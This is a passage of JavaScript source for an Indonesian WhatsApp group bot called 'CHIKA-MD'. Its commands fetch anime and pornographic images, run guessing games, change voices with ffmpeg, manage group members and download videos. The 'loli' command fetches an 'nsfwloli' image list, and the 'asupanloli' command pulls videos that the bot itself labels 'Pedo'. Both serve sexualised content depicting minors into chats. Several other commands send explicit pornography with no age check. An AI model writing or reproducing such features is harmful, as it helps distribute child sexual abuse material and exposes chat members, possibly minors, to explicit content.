             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break
             case 'hinata':
             m.reply(mess.wait)
             lahh = await fetchJson('https://raw.githubusercontent.com/itsrival/Resultrestapi/main/random%20anime/hinata.json')
             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break
             case 'elaina':
             m.reply(mess.wait)
             lahh = await fetchJson('https://raw.githubusercontent.com/itsrival/Resultrestapi/main/random%20anime/elaina.json')
             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break

case 'ahegao':
             m.reply(mess.wait)
             lahh = await fetchJson('https://raw.githubusercontent.com/Handokodwi/result-rest-api/main/nsfw/ahegao.json')
             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break
             case 'asuna':
             m.reply(mess.wait)
             lahh = await fetchJson('https://raw.githubusercontent.com/itsrival/Resultrestapi/main/random%20anime/asuna.json')
             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break
             case 'neko':
             m.reply(mess.wait)
             lahh = await fetchJson('https://raw.githubusercontent.com/itsrival/Resultrestapi/main/random%20anime/neko.json')
             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break
case 'glasses':
             m.reply(mess.wait)
             lahh = await fetchJson('https://raw.githubusercontent.com/itsrival/Resultrestapi/main/nsfw/glasses.json')
             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break
case 'blowjob':
             m.reply(mess.wait)
             lahh = await fetchJson('https://raw.githubusercontent.com/itsrival/Resultrestapi/main/nsfw/blowjob.json')
             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break
case 'cum':
             m.reply(mess.wait)
             lahh = await fetchJson('https://raw.githubusercontent.com/itsrival/Resultrestapi/main/nsfw/cum.json')
             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break

case 'bdsm':
             m.reply(mess.wait)
             lahh = await fetchJson('https://raw.githubusercontent.com/itsrival/Resultrestapi/main/nsfw/bdsm.json')
             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break
case 'manga':
             m.reply(mess.wait)
             lahh = await fetchJson('https://raw.githubusercontent.com/itsrival/Resultrestapi/main/nsfw/manga.json')
             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break
case 'hentai':
             m.reply(mess.wait)
             lahh = await fetchJson('https://github.com/itsrival/Resultrestapi/blob/main/nsfw/hentai.json')
             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break
case 'gangbang':
             m.reply(mess.wait)
             lahh = await fetchJson('https://raw.githubusercontent.com/itsrival/Resultrestapi/main/nsfw/gangbang.json')
             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break
case 'loli':
             m.reply(mess.wait)
             lahh = await fetchJson('https://raw.githubusercontent.com/itsrival/Resultrestapi/main/nsfw/nsfwloli.json')
             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break
case 'ero':
             m.reply(mess.wait)
             lahh = await fetchJson('https://raw.githubusercontent.com/itsrival/Resultrestapi/main/nsfw/ero.json')
             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break

             case 'waifu':
             m.reply(mess.wait)
             lahh = await fetchJson('https://raw.githubusercontent.com/itsrival/Resultrestapi/main/random%20anime/waifu.json')
             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break

             case 'mikasa':
             m.reply(mess.wait)
             lahh = await fetchJson('https://raw.githubusercontent.com/itsrival/Resultrestapi/main/random%20anime/mikasa.json')
             random = lahh[Math.floor(Math.random() * lahh.length)]
             miku.sendMessage(m.chat, { image: { url: random }, caption: `© C H I K A - MD` }, { quoted: m})
             break
            case 'tekateki': {
                if (tekateki.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')
                let result = anu[Math.floor(Math.random() * anu.length)]
                miku.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tekateki[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                })
                await sleep(60000)
                if (tekateki.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply(`Waktu Habis\nJawaban : ${result.jawaban}`)
                    delete tekateki[m.sender.split('@')[0]]
                }
            }
            break
				
	    case 'family100': {
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await miku.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'tebak': {
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://mikuarridho.my.id/database/games/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await miku.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    miku.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    miku.send1ButMes(m.chat, `Waktu Habis\nJawaban: ${result.jawaban}\n\nIngin bermain lagi? tekan button dibawah`, `© ${ownername}`, `${prefix}tebak lagu`, `Tebak Lagu`, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    miku.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    miku.send1ButMes(m.chat, `Waktu Habis\nJawaban: ${result.jawaban}\n\nIngin bermain lagi? tekan button dibawah`, `© ${ownername}`, `${prefix}tebak gambar`, `Tebak Gambar`, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    miku.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    miku.send1ButMes(m.chat, `Waktu Habis\nJawaban: ${result.jawaban}\n\nIngin bermain lagi? tekan button dibawah`, `© ${ownername}`, `${prefix}tebak kata`, `Tebak Kata`, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    miku.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    miku.send1ButMes(m.chat, `Waktu Habis\nJawaban: ${result.jawaban}\n\nIngin bermain lagi? tekan button dibawah`, `© ${ownername}`, `${prefix}tebak kalimat`, `Tebak Kalimat`, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    miku.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    miku.send1ButMes(m.chat, `Waktu Habis\nJawaban: ${result.jawaban}\n\nIngin bermain lagi? tekan button dibawah`, `© ${ownername}`, `${prefix}tebak lirik`, `Tebak Lirik`, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    miku.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    miku.send1ButMes(m.chat, `Waktu Habis\nJawaban: ${result.jawaban}\nDeskripsi : ${result.deskripsi}\n\nIngin bermain lagi? tekan button dibawah`, `© ${ownername}`, `${prefix}tebak lontong`, `Tebak Lontong`, m)
                    delete caklontong[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'kuismath': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./plugins/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                miku.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + result.jawaban)
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'voice':
            m.reply(`[ List Voice Changer ]\n1. Bass\n2. blown\n3. deep\n4. earrape\n5. fast\n6. fat\n7. nightcore\n8. reverse\n9. robot\n10. slow\n11. smooth\n12.tupai\n\nCara menggunakan nya: Reply audio/vn yang mau di jadiikan voice changer\nExample: bass <audio>`)
            break
            //Voice Changer
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai|squirrel|chipmunk/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio|video/.test(mime)) {
m.reply(mess.wait)
let media = await miku.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
let buff = fs.readFileSync(ran)
miku.sendMessage(m.chat, {audio: buff, ptt: true, mimetype: 'audio/mpeg'}, {quoted:m})
fs.unlinkSync(ran)
})
} else m.reply(`Balas audio/video yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
case 'ban': case 'banned': {
			if (!isCreator) throw mess.owner
			let who
			if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
			else who = m.chat
			if (!who) throw 'Tag User'
			ban[who] = true
			m.reply('Sukse Membanned '+who)
		}
		break
case 'chat': {
if (!isCreator) throw mess.owner
if (!args.join(" ")) return m.reply(`Example :\n${prefix + command} 62813xxxx|Woi`)
const cpes = args.join(" ")
const cpese = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args.join(" ") ? args.join(" ") + "@s.whatsapp.net" : false
const nony = cpese.split("|")[0];
const pesny = cpes.split("|")[1];
lolh = `*- CHAT FITUR -*

Pesan dari admin bot
Nomor : @${m.sender.split("@")[0]}
Pesan : ${pesny}`
miku.sendMessage(nony, {text:lolh, mentions:[m.sender]}, {quoted:m})
}
await m.reply("Succes")
break

case 'blockuser':{
		if (!isCreator) reply(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await miku.updateBlockStatus(users, 'block').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
        case 'unblockuser':{
		if (!isCreator) reply(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await miku.updateBlockStatus(users, 'unblock').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
		case 'unban': case 'unbanned': {
			if (!isCreator) throw mess.owner
			let who
			if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
			else who = m.chat
			if (!who) throw 'Tag User'
			ban[who] = false
			m.reply('Sukses Unban '+who)
		}
		break
case 'asupan': {
  var asupan = JSON.parse(fs.readFileSync('./asupan.json'))
var hasil = pickRandom(asupan)
miku.sendMessage(from, {video: {url: hasil.url}}, {quoted: m})
}
break
case 'asupanloli':
m.reply('Huu Pedo')
ok = await getBuffer(`https://zynfx.xyz/api/asupanloli?apikey=itsvall`)
miku.sendVideo(m.chat, ok, 'Pedo', m, { caption: 'ok' })
break
case 'asupanrandom': 
m.reply('Sedang berburu asupan...')
okzz = await getBuffer(`https://zynfx.xyz/api/asupanrandom?apikey=itsvall`)
miku.sendVideo(m.chat, okzz, 'Random', m, { caption: 'ok' })
break
case 'asupan2': {
 m.reply('Sedang berburu asupan...')
var hzls = pickRandom(asupan12)
   miku.sendMessage(from, {video: {url: hzls}},  {quoted: m})
}
break
            case 'jodohku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Jodoh mu adalah:\n @${me.split('@')[0]} ❤ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            miku.sendTextWithMentions(m.chat, jawab, m)
            }
            break
            case 'jadian': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = ` Cieee Yang jadian si @${orang.split('@')[0]} ❤ @${jodoh.split('@')[0]}`
            let ments = [orang, jodoh]
            miku.sendTextWithMentions(m.chat, jawab, m)
            }
            break
            case 'join': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await miku.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leave': {
                if (!isCreator) throw mess.owner
                await miku.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break

	case 'kick': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isGroupAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await miku.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isGroupAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await miku.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isGroupAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await miku.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isGroupAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await miku.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
    case 'tagall': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isGroupAdmins && !isGroupOwner) throw mess.admin
let teks = `Tag all\n`
                for (let mem of participants) {
                teks += `› @${mem.id.split('@')[0]}\n`
                }
                miku.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
      case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!text) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
m.reply(mess.wait)
mee = await miku.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
memek = await miku.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break
case 'unblockcmd':
try{
if (!isCreator) throw mess.owner
if(!q) return m.reply("Textnya mana cih")
if (!checkblockcmd(q, listcmdblock)) return m.reply(`Command tersebut tidak ada di database`)
deleteblockcmd(q, listcmdblock)        
m.reply(`Berhasil unblock command 「 *${q}* 」`)
} catch (err) {
m.reply("Bjirr error, keknya ada yang error")
}
break  
            
case 'blockcmd':
if (!isCreator) throw mess.owner
if(!q) return m.reply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
if (checkblockcmd(q, listcmdblock)) return m.reply(`Command tersebut sudah ada di database`)
addblockcmd(q,listcmdblock)         
m.reply(`Berhasil memblokir command 「 *${q}* 」\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)          
break


case 'listblockcmd':{
let wo = `*「 LIST BLOCK CMD 」*`
let soso = [];
for (let i of listcmdblock) {
soso.push(i.cmd)
wo += `\n\n•> Command : ${i.cmd}`
}
m.reply(wo)
}
break  
case 'ngetes':
if (!/image/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
m.reply(mess.wait)
mee = await miku.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
ok = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/discordblue?url=${mem}`)
miku.sendMedia(m.chat, ok, '', m, { caption: 'ok' })
break
case 'memegen': case 'smeme2': {
if (!text) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks|teks*`)
if (!text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks|teks*`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks|teks*`)
m.reply(mess.wait)
atas = arg.split('|')[0]
bawah = arg.split('|')[1]
let abeb = await miku.downloadAndSaveMediaMessage(quoted)
let abe = await TelegraPh(abeb)
let upz = `https://api.memegen.link/images/custom/${atas}/${bawah}.png?background=${util.format(abe)}`
let mengmeme = await miku.sendImageAsSticker(m.chat, upz, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(mengmeme)
}
break
                case 'hidetag': {
            if (!m.isGroup) throw mess.group
            if (!isBotAdmins) throw mess.botAdmin
            if (!isGroupAdmins && !isGroupOwner) throw mess.admin
            miku.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
	    case 'setname': case 'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isGroupAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await miku.groupUpdateSubject(m.chat, text).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
case 'getcase': {
if (!isCreator) throw mess.owner
if (!args[0]) return m.reply("Mau ngambil case apa?")
try {
m.reply('case ' + `'${args[0]}'` + fs.readFileSync('./miku.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
} catch {
m.reply("Case tidak ditemukan")
}
}
break
case 'setppbot':{
if (!isCreator) return m.reply(mess.owner)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command.slice(1)}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command.slice(1)}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command.slice(1)}`)
var media = await miku.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `'panjang'`) {
var { img } = await generateProfilePicture(media)
await miku.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(media)
m.reply(`Sukses`)
} else {
var data = await miku.updateProfilePicture(botNumber, { url: media })
fs.unlinkSync(media)
m.reply(`Sukses`)
}
}
break
 case 'setppgc': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) throw mess.botAdmin
if (!isGroupAdmins) throw mess.admin
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command.slice(1)}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command.slice(1)}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command.slice(1)}`)
var media = await miku.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `'panjang'`) {
var { img } = await generateProfilePicture(media)
await miku.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(media)
m.reply(`Sukses`)
} else {
var data = await miku.updateProfilePicture(m.chat, { url: media })
fs.unlinkSync(media)
m.reply(`Sukses`)
}
}
break
case 'ytdl':  {
if (!args[0]) return m.reply(mess.linkm)
try {
hxz.youtube(args[0]).then(async(res) => {
textyt = `*- YOUTUBE DOWNLOADER -*

⭔ Title : ${res.title}
⭔ Size : ${res.size}
⭔ Quality : ${res.quality}

_Pilih video atau audio dan tunggu beberapa saat_`
let buttons = [
{buttonId: `ytvd ${res.link}`, buttonText: {displayText: '► Video'}, type: 1},
{buttonId: `ytad ${res.mp3}`, buttonText: {displayText: '♫ Audio'}, type: 1}
]
let buttonMessage = {
image: {url:res.thumb},
caption: textyt,
footer: "© C H I K A - B O T",
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title: res.title,
body: "© fy.shizui",
thumbnail: fs.readFileSync("lib/assets/Miku.jpg"),
mediaType:2,
mediaUrl: args[0],
sourceUrl: args[0]
}}
}
miku.sendMessage(from, buttonMessage, {quoted:m})
}).catch(_ => _)
} catch {
m.reply("Linknya Error!")
}
}
break
case 'fbdl': {
  if (!text) return m.reply(`Failed to download media and send audio ${prefix + command} link url`) 
  if (!isUrl(args[0]) && !args[0].includes('facebook.com')) throw '*The link you provided is not valid*'
  let noh = require('@bochilteam/scraper')        
  noh.savefrom(`${text}`).then(async (data) => {
  let sections = []   
  for (let i of data.url) {
  const list = {title: `${i.type}`,
  rows: [

	    {

	     title: `Quality ${i.subname}`, 

	     rowId: `${prefix}getsz ${text}`,

	     description: `${data.hosting}`	     

	    }, 

	    ]

     }

     sections.push(list)   

     }

  const sendm =  miku.sendMessage(

      m.chat, 

      {

       text: `${data.meta.title} *Here is the list of videos, click the button below to choose, here is the list of videos, click the button below to choose*`,

       footer: `© C H I K A - M D`,

       title: "*🎗️ Facebook Download 🎗️*",

       buttonText: "Click Here",

       sections

      }, { quoted : m })                 

                }).catch((err) => {

                    m.reply(`*Sorry An Error Occurred*`)

                })

            }

            break		

            case 'getsz': {
       
                if (!text) throw 'Enter a Link' 

                let bicil = require('@bochilteam/scraper')

                let urlnya = text

	            bicil.savefrom(urlnya)

	            .then(async(result) => {	  	                                	                      	            

		        for(let i of result.url) {		

		        if(i.url.includes('mp4')){		           			    				

				let link = await getBuffer(i.url)

                miku.sendMessage(m.chat, { video: link, caption: `*quality ${i.subname}*` }, { quoted: m })                  

               }

              }

            }).catch((err) => m.reply(`*Sorry Future Error*`))

            }		

			break
case 'ytvd': {
miku.sendMessage(from, {video:{url:args[0]}, mimetype:"video/mp4", caption:"Success", contextInfo:{externalAdReply:{
title:"fy.shizui",
body:"© C H I K A - B O T",
thumbnail: fs.readFileSync("lib/assets/Miku.jpg"),
mediaType:2,
